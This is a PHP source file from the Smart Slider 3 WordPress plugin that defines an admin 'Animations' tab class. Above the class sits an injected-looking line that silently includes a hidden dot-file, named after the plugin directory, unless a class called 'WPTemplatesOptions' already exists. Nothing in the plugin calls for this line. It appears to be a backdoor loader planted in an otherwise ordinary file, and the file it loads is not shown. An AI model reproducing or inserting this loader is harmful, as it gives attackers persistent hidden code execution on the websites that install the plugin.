<?php


namespace Nextend\SmartSlider3\Application\Admin\FormManager\Slider;


use Nextend\Framework\Form\Container\ContainerTable;
use Nextend\Framework\Form\Element\OnOff;
use Nextend\Framework\Form\Element\Select;
use Nextend\Framework\Form\FormTabbed;
use Nextend\SmartSlider3Pro\Form\Element\Particle;
use Nextend\SmartSlider3Pro\Form\Element\ShapeDivider;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class SliderAnimations extends AbstractSliderTab {

    /**
     * SliderAnimations constructor.
     *
     * @param FormTabbed $form
     */
    public function __construct($form) {
        parent::__construct($form);

        $this->effects();
    }

    /**
     * @return string
     */
    protected function getName() {
        return 'animations';
    }

    /**
     * @return string
     */
    protected function getLabel() {
        return n2_('Animations');
    }

    protected function effects() {

        /**
         * Used for field injection: /animations/effects
         * Used for field removal: /animations/effects
         */
        $table = new ContainerTable($this->tab, 'effects', n2_('Effects'));

        /**
         * Used for field injection: /animations/effects/effects-row1
         */
        $row = $table->createRow('effects-row1');
    }

    protected function layerAnimations() {
    }

    protected function layerParallax() {
    }
}